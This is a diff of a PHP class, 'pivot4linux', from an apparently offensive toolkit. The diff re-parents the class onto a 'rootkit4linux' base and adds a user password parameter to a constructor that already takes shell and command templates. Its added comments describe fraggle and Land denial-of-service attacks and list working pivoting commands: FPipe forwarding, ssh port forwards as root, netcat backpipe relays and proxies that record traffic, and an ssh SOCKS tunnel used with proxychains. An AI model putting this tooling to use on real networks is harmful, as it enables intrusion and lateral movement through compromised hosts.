@@ -1,6 +1,6 @@
 <?php
 
-class pivot4linux extends check4linux{
+class pivot4linux extends rootkit4linux{
     
     var $firewall_rules_str ;
     var $ifconfig_str ; 
@@ -8,22 +8,50 @@ class pivot4linux extends check4linux{
     /*
      
      https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/
+
+     http://tools.kali.org/information-gathering/fragroute
+     http://tools.kali.org/stress-testing/inundator
+     
+     In a fraggle DoS attack, an attacker sends a large amount of UDP echo requests traffic to the IP broadcast addresses. These UDP requests have a spoofed
+     source address of the intended victim. If the routing device delivering traffic to those broadcast addresses delivers the IP broadcast to all the hosts, most of the IP
+     addresses send an ECHO reply message. However, on a multi-access broadcast network, hundreds of computers might reply to each packet when the target
+     network is overwhelmed by all the messages sent simultaneously. Due to this, the network becomes unable to provide services to all the messages and crashes.
+     In a Land attack, the attacker sends a spoofed TCP SYN packet in which the IP address of the target is filled in both the source and detination fields. On recieving
+     the spoofed packet, the target system becomes confused and goes into a frozen state. Now-a-days, antivirus can easily detect such an attack.
+     
+     https://bitvijays.github.io/LFC-VulnerableMachines.html
      
      
      
+     
+     
+     # fpipe
+     # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+     FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+     
+     # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+     ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+     ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+     
+     # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
+     mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
+     mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+     mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+     
+     
+     Is tunnelling possible? Send commands locally, remotely
+     ssh -D 127.0.0.1:9050 -N [username]@[ip]
+     proxychains ifconfig
      
      
      
      */
     
+    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass) {
+        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass);
     
-    
-    
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
-        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
-        
         $data = "iptables -L -n";
-        $this->firewall_rules_str = $this->lan2stream4result($data,$this->stream_timeout);
+       // $this->firewall_rules_str = $this->lan2stream4result($data,$this->stream_timeout);
     
     }
     
